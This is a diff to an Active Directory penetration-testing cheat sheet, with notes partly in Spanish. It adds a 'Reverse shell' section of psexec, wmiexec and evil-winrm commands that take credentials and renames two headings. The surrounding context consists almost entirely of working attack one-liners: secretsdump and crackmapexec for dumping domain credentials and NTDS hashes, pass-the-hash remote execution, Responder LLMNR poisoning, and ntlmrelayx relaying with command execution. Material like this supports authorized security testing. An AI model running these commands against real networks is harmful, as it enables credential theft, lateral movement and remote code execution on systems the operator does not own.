@@ -869,6 +869,17 @@ secretsdump.py domain.local/USER:PASSWORD@IP
 ```
 crackmapexec smb network/address -u users -p passwords --ntds vss
 ```
+Reverse shell
+```
+psexec.py domain/user:'password'@IP
+```
+```
+wmiexec.py domain/user:'password'@IP
+```
+```
+evil-winrm -i IP -u user -p 'password'
+```
+
 Pass the hash
 
 ```
@@ -880,12 +891,12 @@ psexec.py domain.local/user@ip -hashes 'LMHASH:NTHASH'
 ```
 wmiexec.py user@IP -hashes 'LMHASH:NTHASH'
 ```
-SMB Relay
+LLMNR poisoning
 
 ```
 responder -I  NETINTERFACE -dw
 ```
-NTLM Relay [responder.conf con smb y http en "off" (SAM dumping without '-c')]
+SMB Relay [responder.conf con smb y http en "off" (SAM dumping without '-c')]
 
 ```
 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
